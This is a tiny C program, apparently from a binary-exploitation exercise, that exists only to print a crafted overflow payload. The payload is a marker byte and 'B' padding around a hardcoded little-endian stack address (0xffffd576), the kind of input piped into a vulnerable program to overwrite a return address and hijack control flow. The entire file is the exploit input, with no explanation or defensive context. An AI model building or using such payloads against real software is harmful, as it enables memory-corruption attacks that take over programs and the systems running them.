# include <stdio.h>
#include <unistd.h>

int main()
{
		printf("\x80" \
			"BBBBBBBBBBBB" \
			"\x76\xd5\xff\xff" \
			"BBBB" \
			"\n");
}
